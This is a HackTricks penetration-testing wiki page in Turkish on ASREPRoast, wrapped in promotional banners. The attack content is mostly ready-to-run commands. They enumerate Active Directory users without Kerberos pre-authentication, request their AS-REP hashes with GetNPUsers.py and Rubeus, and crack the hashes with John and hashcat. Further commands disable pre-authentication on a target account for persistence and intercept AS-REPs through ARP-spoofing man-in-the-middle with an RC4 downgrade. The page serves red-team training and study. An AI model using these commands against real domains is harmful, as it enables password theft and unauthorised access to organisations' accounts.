# ASREPRoast

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## ASREPRoast

ASREPRoast, **Kerberos ön kimlik doğrulama gerekli niteliği** eksik olan kullanıcıları hedef alan bir güvenlik saldırısıdır. Temelde, bu zafiyet, saldırganların kullanıcının şifresine ihtiyaç duymadan Domain Controller (DC) üzerinden bir kullanıcı için kimlik doğrulama talep etmelerine olanak tanır. DC, ardından kullanıcının şifresine dayalı anahtarla şifrelenmiş bir mesajla yanıt verir; saldırganlar bu mesajı çevrimdışı olarak çözmeye çalışarak kullanıcının şifresini keşfetmeye çalışabilirler.

Bu saldırı için ana gereksinimler şunlardır:

* **Kerberos ön kimlik doğrulama eksikliği**: Hedef kullanıcıların bu güvenlik özelliği etkin olmamalıdır.
* **Domain Controller (DC) ile bağlantı**: Saldırganların talepleri gönderebilmek ve şifreli mesajları alabilmek için DC'ye erişimleri olmalıdır.
* **İsteğe bağlı domain hesabı**: Bir domain hesabına sahip olmak, saldırganların LDAP sorguları aracılığıyla savunmasız kullanıcıları daha verimli bir şekilde tanımlamalarını sağlar. Böyle bir hesap olmadan, saldırganlar kullanıcı adlarını tahmin etmek zorundadır.

#### Savunmasız kullanıcıları listeleme (domain kimlik bilgileri gerektirir)

{% code title="Using Windows" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% endcode %}

{% code title="Linux Kullanımı" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS\_REP mesajı isteği

{% code title="Linux Kullanarak" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Windows Kullanımı" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
Rubeus ile AS-REP Roasting, 0x17 şifreleme türü ve 0 ön kimlik doğrulama türü ile bir 4768 oluşturacaktır.
{% endhint %}

### Kırma
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Süreklilik

**GenericAll** izinlerine (veya özellikleri yazma izinlerine) sahip olduğunuz bir kullanıcı için **preauth** zorunlu değildir:

{% code title="Using Windows" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endcode %}

{% code title="Linux Kullanımı" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
{% endcode %}

## ASREProast kimlik bilgisi olmadan

Bir saldırgan, Kerberos ön kimlik doğrulamasının devre dışı bırakılmasına güvenmeden, AS-REP paketlerini ağda geçerken yakalamak için bir man-in-the-middle pozisyonu kullanabilir. Bu nedenle, VLAN'daki tüm kullanıcılar için çalışır.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) bunu yapmamıza olanak tanır. Ayrıca, araç, Kerberos müzakeresini değiştirerek istemci iş istasyonlarının RC4 kullanmasını zorlar.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Referanslar

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve bug bounty avcıları ile iletişim kurmak için [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın!

**Hacking İçgörüleri**\
Hacking'in heyecanı ve zorluklarına dalan içeriklerle etkileşimde bulunun

**Gerçek Zamanlı Hack Haberleri**\
Gerçek zamanlı haberler ve içgörülerle hızlı tempolu hacking dünyasında güncel kalın

**Son Duyurular**\
Yeni başlayan bug bounty'ler ve önemli platform güncellemeleri hakkında bilgi sahibi olun

**Bize katılın** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugün en iyi hackerlarla işbirliği yapmaya başlayın!

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter**'da **bizi takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
